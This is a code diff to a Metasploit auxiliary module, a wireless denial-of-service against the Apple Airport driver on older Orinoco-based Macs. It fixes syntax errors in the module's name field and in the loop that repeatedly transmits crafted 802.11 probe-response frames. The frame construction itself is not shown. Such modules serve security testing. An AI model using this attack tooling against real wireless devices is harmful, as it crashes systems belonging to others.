@@ -5,11 +5,11 @@ module Msf
 class Auxiliary::Dos::Wireless::DaringPhucball < Msf::Auxiliary
 
 	include Exploit::Lorcon
-	include Auxiliary::Dos
+
 
 	def initialize(info = {})
 		super(update_info(info,	
-			'Name'           => 'Apple Airport 802.11 Probe Response Kernel Memory Corruption'
+			'Name'           => 'Apple Airport 802.11 Probe Response Kernel Memory Corruption',
 			'Description'    => %q{
 				The Apple Airport driver provided with Orinoco-based Airport cards (1999-2003 PowerBooks, iMacs)
 				is vulnerable to a remote memory corruption flaw. When the driver is placed into active scanning 
@@ -45,9 +45,7 @@ class Auxiliary::Dos::Wireless::DaringPhucball < Msf::Auxiliary
 		frame = create_frame()
 		
 		print_status("Sending #{cnt} frames...")
-		0.upto(cnt)
-			wifi.write(frame)	
-		end
+		0.upto(cnt) { |i| wifi.write(frame)	}
 	end
 	
 	def eton(addr)
@@ -75,7 +73,7 @@ class Auxiliary::Dos::Wireless::DaringPhucball < Msf::Auxiliary
 		
 		return frame
 
-	end
+	end	
 end
 end	
 
